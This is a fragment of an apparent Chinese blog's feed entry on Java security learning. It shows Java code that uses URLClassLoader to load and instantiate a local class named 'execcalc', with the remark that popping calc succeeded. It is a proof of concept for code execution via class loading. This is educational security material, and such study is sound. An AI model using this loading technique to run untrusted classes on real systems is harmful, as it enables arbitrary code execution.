class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NullPointerException, InstantiationException, IllegalAccessException, MalformedURLException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;E:\\github\\JavaSecLearn\\Code\\JavaSecLearn\\src\\com\\yutao\\day1\\&quot;</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">&quot;com.yutao.day1.execcalc&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹calc成功解析class文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言-流程&quot;&gt;&lt;a href=&quot;#前言-流程&quot; class=&quot;headerlink&quot; title=&quot;前言+流程&quot;&gt;&lt;/a&gt;前言+流程&lt;/h1&gt;&lt;p&gt;java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Java" scheme="https://ghostasky.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
